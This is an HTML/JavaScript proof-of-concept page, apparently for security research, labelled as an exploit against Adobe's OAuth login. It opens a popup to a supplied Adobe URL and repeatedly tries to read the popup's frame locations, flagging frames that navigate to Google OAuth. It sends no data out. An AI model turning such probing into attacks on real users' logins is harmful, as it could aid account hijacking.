<!DOCTYPE html>
<html>
<head>
  <title>Adobe OAuth Frame Monitor PoC</title>
  <style>
    body { font-family: monospace; background: #111; color: #0f0; padding: 20px; }
    button { padding: 10px 20px; margin: 10px; background: #4caf50; color: white; border: none; cursor: pointer; }
    #log { margin-top: 20px; background: #000; color: #0f0; padding: 10px;
           font-family: monospace; height: 300px; width: 95%; overflow-y: auto; }
  </style>
</head>
<body>
  <h2>Adobe OAuth Frame Monitor PoC</h2>
  <button onclick="launch()">Exploit</button>
  <div id="log"></div>

<script>
function log(msg) {
  document.getElementById("log").innerHTML += msg + "<br>";
  let box = document.getElementById("log");
  box.scrollTop = box.scrollHeight;
}

let popup;

// open Adobe site
function launch() {
  let urlParam = new URLSearchParams(window.location.search).get("url");
  if (!urlParam) {
    log("❌ Missing ?url= parameter. Example: ?url=https://firefly.adobe.com/");
    return;
  }

  log("▶ Opening popup: " + urlParam);
  popup = window.open(urlParam, "adobe", "width=800,height=700");
  setTimeout(() => {
    log("▶ Starting frame monitor...");
    monitorPopup();
  }, 3000);
}

// monitor popup frames
function monitorPopup() {
  if (!popup || popup.closed) {
    log("❌ Popup closed.");
    return;
  }

  try {
    // enumerate frames inside popup
    for (let i = 0; i < popup.frames.length; i++) {
      try {
        let loc = popup.frames[i].location.href;
        log("Frame[" + i + "]: " + loc);

        if (loc.includes("accounts.google.com")) {
          log("⚠ Frame[" + i + "] navigated to Google OAuth: " + loc);
        }
      } catch (e) {
        log("Frame[" + i + "]: cross-origin (cannot read).");
      }
    }
  } catch (e) {
    log("⚠ Cannot access popup (different origin). Waiting...");
  }

  setTimeout(monitorPopup, 1500);
}
</script>
</body>
</html>
